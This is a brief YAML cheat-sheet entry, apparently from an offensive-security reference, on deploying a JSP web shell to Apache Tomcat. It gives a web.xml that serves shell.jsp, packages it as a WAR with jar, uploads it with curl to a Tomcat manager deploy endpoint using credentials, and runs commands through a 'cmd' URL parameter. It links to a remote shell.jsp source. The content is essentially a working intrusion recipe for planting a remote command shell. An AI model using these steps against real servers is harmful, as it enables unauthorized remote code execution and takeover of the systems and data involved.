---
functions:
  shell:
    - description: war web shell (in jsp format)
      code: |
        (1) File Structure:
        	├── shell.jsp
			└── WEB-INF
		    	└── web.xml
		web.xml:
		\<?xml version="1.0"?>
		\<!DOCTYPE web-app PUBLIC
		\"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
		\"http://java.sun.com/dtd/web-app_2_3.dtd">
		\<web-app>
		\  <welcome-file-list>
		\    <welcome-file>shell.jsp</welcome-file>
		\  </welcome-file-list>
		\</web-app>

        (2) jar -cf shell.war *
        (3) curl --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/{context}&update=true" -u {username}
        https://{address}/shell.jsp?cmd=whoami
resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/shell.jsp
---
